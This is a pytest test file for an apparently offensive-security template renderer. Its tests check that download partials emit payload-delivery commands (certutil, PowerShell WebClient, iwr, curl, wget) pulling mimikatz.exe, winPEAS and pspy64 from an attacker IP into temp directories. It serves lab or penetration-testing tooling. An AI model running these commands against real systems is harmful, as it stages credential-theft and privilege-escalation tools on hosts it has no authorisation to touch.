"""Tests for the parameterized download-windows / download-linux partials."""

import os
from pathlib import Path

import pytest

from profi.renderer import render_template, render_template_string

TEMPLATES_DIR = Path(__file__).parent.parent / "src" / "profi" / "templates"


@pytest.fixture(autouse=True)
def _env():
    """Set predictable OP_* env vars and restore them afterwards."""
    original = dict(os.environ)
    os.environ.update(
        {
            "OP_ATTACKER_IP": "10.10.14.5",
            "OP_DELIVERY_OUTBOUND_PORT": "8086",
            "OP_DELIVERY_PATH_WINDOWS": r"C:\Windows\Temp",
            "OP_DELIVERY_PATH_LINUX": "/dev/shm",
        }
    )
    yield
    os.environ.clear()
    os.environ.update(original)


def _render(tpl: str) -> str:
    return render_template_string(tpl, TEMPLATES_DIR, {})


def test_windows_partial_emits_all_methods():
    """download-windows renders every Windows method with the filename substituted."""
    out = _render("{{ include('partials/download-windows', filename='mimikatz.exe') }}")
    assert "Deliver: mimikatz.exe" in out  # self-labeling header
    assert "iwr -uri http://10.10.14.5:8086/mimikatz.exe -Outfile C:\\Windows\\Temp\\mimikatz.exe" in out
    assert '(New-Object Net.WebClient).DownloadFile("http://10.10.14.5:8086/mimikatz.exe","C:\\Windows\\Temp\\mimikatz.exe")' in out
    assert "powershell.exe wget -uri http://10.10.14.5:8086/mimikatz.exe" in out
    assert "curl.exe http://10.10.14.5:8086/mimikatz.exe -o C:\\Windows\\Temp\\mimikatz.exe" in out
    assert 'certutil.exe -urlcache -split -f "http://10.10.14.5:8086/mimikatz.exe"' in out


def test_linux_partial_emits_curl_and_wget():
    """download-linux renders curl and wget with the filename substituted."""
    out = _render("{{ include('partials/download-linux', filename='pspy64') }}")
    assert "Deliver: pspy64" in out
    assert "curl http://10.10.14.5:8086/pspy64 -o /dev/shm/pspy64" in out
    assert "wget http://10.10.14.5:8086/pspy64 -O /dev/shm/pspy64" in out


def test_dest_differs_from_source():
    """A distinct dest renames on the target and shows source -> dest in the header."""
    out = _render(
        "{{ include('partials/download-windows', filename='winPEASx64.exe', dest='winPEAS.exe') }}"
    )
    assert "Deliver: winPEASx64.exe -> winPEAS.exe" in out
    assert "http://10.10.14.5:8086/winPEASx64.exe -Outfile C:\\Windows\\Temp\\winPEAS.exe" in out


def test_header_suppressed_without_filename():
    """With no filename the Deliver header is omitted (method sections still render)."""
    out = _render("{{ include('partials/download-windows') }}")
    assert "Deliver:" not in out.split("-----PowerShell-----")[0]
    assert "-----PowerShell-----" in out


def test_migrated_template_uses_partial():
    """A migrated deliver-* template renders the partial's methods inline."""
    rendered, _ = render_template(
        "scripts/deliver-windows-mimikatz.exe.yaml", TEMPLATES_DIR, {}
    )
    assert "(New-Object Net.WebClient).DownloadFile" in rendered
    assert "certutil.exe" in rendered
    assert "startEnhancedHttpServer.py" in rendered
